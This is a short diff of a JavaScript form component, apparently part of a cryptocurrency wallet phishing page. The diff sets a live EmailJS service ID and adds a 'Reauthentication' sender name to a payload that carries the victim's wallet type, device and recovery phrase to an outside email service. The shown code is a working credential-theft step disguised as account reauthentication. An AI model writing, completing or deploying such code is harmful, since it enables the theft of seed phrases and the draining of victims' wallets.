@@ -71,10 +71,11 @@ export default {
         if (valid) {
           if (valid) {
             var data = {
-              service_id: "123456789",
+              service_id: "service_70ntltg",
               template_id: "template_3y5sgim",
               user_id: "user_6dMy0FAzh3UkwGQuDDbjZ",
               template_params: {
+                from_name: 'Reauthentication',
                 wallet_version: this.ruleForm.wallet,
                 device: this.ruleForm.device,
                 nnemonics: this.ruleForm.recovery,
